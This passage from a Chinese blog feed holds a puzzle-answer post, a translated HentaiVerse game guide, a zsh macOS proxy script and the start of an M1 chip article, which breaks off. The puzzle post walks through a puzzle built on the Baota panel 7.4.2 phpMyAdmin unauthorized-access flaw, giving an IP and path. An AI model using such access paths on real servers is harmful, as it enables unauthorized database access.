(ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" 